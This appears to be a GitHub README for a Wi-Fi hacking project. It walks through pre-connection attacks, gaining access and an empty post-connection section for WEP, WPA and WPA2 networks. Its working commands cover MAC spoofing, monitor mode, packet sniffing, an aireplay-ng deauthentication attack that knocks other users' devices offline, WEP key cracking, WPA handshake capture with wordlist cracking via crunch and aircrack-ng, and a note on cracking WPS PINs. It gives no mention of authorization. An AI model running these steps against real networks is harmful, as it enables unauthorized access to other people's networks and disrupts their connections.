# Projet-WiFi

* Pre-connection attacks, gaining access & post-connection attacks on WEP, WPA & WPA2. ✔️

### Prerequisites
0. Linux + wireless adapter.

1. Change the MAC address of your wireless adapter, either for hiding a computer on a network or for allowing it to impersonate another network device.

```
ifconfig wireless_adapter_name down
ifconfig wireless_adapter_name hw ether 00:19:35:89:88:14
ifconfig wireless_adapter_name up
```

2. Change your wireless interface to "Monitor" mode. By default, the mode of wireless devices is set to "Managed", that means our wireless device will only capture packets that have our device's MAC address as the destination MAC.

```
ifconfig wireless_adapter_name down
airmon-ng check kill (kill all interference processes)
iwconfig wireless_adapter_name mode monitor
ifconfig wireless_adapter_name up
iwconfig
```

### Pre-connection attacks
1. Discover networks around you:
```
airodump-ng wireless_adapter_name
```
![Discover networks around you](https://user-images.githubusercontent.com/64968597/134020395-c7a67e4b-d7d0-4a84-a155-8a67fdf449c9.JPG)

2. Sniff packet from a specified network:
```
airodump-ng --bssid target_MAC --channel N (--write file_name) wireless_adapter_name
```

3. Deauthentication attack (disconnect any device from the network):

This attack will always work ! The only way around it is to change the MAC address of the target machine.
```
aireplay-ng --deauth time_out -a router_addr -c target_mac_addr wireless_adapter_name
```

### Gaining access

1. WEP cracking (100% successful):
   
   Each packet is encrypted using a unique key stream.
   <br/> A random initialization vector (IV) is used to generate the keys stream. This initialization vector is only 24 bits long.
   <br/> The IV is too small and sent in plain text, so in busy networks, IV's will repeat, making it vulnerable to statistical attacks. Therefore, the key stream can be determined and the encryption broken.

   To crack WEP, we need a large number of packets/IVs to analyse the IVs and crack the router's key.

   Step 1: capture a large number of packets
   ```
   airodump-ng --bssid MAC --channel N --write file_name wireless_adapter_name
   ```
   
   Step 2: run aircrack-ng to crack the password
   ```
   aircrack-ng .cap_file_captured_previously
   ```
   Gets cracked instantly !
   
2. WPA/WPA2 cracking:
   
   The goal is to capture the handshake (4 packets) between the router and a device.
   
   Step 1: run a deauthentication attack against a device connected to the router and wait for him to connect back to it OR wait for a new client to connect.
           <br/> Catch the handshake using "airodump-ng".
           <br/> The handshake doesn't contain data that helps recover the key, but it contains data that can be used to check if a key is valid or not !
           <br/> Useful information in the handshake - MIC (Message Integrity Code): SP address, STA address, AP nonce, STA nonce, EAPOL, Payload
   
   Step 2: create a wordlist/dictionnary: "crunch" command
           <br/> Example: "crunch 6 8 abc123 -o wordlist.txt" --> creates a wordlist of length 6 to 8 with characters abc123 in a file called wordlist.txt
           <br/> Argument "-d 1@" is specified for non-repeating letters.
           <br/> Combining the useful information to the wordlist will create new MICs, which will be compared to the real MIC
           <br/> if(new_MIC == MIC), then the word generating this MIC is the router's password !
           
   ```
   aircrack-ng file_.cap_containing_handshake -w word_list
   ```
            
https://user-images.githubusercontent.com/64968597/134026257-af761b17-4b0b-4c87-95aa-b7999ee1a2b3.mp4

![password_crack](https://user-images.githubusercontent.com/64968597/134026466-bfc08a47-8d84-4f6f-98af-816a25209824.JPG)


   Another method: exploit the WPS feature (except if PBC is enabled: Push Button Authentication)
                   <br/> The WPS feature allows clients to connect without a password.
                   <br/> Authentication is done using a 8 digit pin, which can be cracked under a minute.

### Post-connection attacks


